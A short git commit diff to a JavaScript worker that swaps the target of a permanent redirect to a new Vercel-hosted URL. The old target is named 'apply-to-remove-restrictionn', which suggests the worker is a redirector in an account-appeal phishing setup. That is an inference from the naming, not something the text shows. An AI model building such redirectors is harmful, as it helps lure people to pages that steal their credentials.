622e52bc9dacabfa049d2c4f8dc8cb5053b6c513
sajajdkori <roughwork561@gmail.com>
2026-02-27 23:02:21 +0500

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,7 @@
 export default {
   async fetch(request) {
     // The URL you want people to be sent to
-    const destinationURL = "https://apply-to-remove-restrictionn.netlify.app";
+    const destinationURL = "https://dhak-topaz.vercel.app/";
 
     // This creates a 301 (Permanent) redirect
     return Response.redirect(destinationURL, 301);
